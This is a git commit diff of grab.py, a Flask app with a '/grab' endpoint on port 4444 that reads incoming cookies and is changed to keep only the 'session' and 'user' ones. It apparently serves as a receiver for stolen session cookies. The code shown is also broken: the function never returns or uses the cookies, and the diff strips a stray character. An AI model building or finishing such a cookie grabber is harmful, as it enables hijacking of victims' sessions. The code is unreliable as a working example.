d9fe01049967d8b3fe2c09120b016f720b7efba1
burple <71650901+holis640@users.noreply.github.com>
2025-01-07 22:34:20 +0100

    Update grab.py

--- grab.py
+++ grab.py
@@ -4,7 +4,7 @@ app = Flask(__name__)
 
 @app.route('/grab', methods=['GET'])
 def grab():
-    cookies = request.cookies
-
+    allowed_cookies = ['session', 'user']
+    cookies = {key: value for key, value in request.cookies.items() if key in allowed_cookies}
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=4444)¡
+    app.run(host='0.0.0.0', port=4444)
